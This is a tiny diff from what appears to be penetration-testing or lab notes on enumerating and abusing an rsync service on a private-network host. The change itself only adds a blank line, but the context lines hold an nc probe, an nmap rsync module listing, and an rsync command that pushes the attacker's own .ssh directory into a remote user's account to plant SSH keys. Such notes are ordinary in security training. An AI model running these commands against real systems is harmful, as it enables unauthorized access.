@@ -623,6 +623,7 @@ nc -vn 192.168.152.126 873
 nmap -sV --script "rsync-list-modules" -p 873  192.168.152.126 --List Shares
 
 rsync -av /home/kali/.ssh rsync://fox@192.168.152.126/fox/.ssh
+
 '''
 
 ## Port 1030/1032/1033/1038
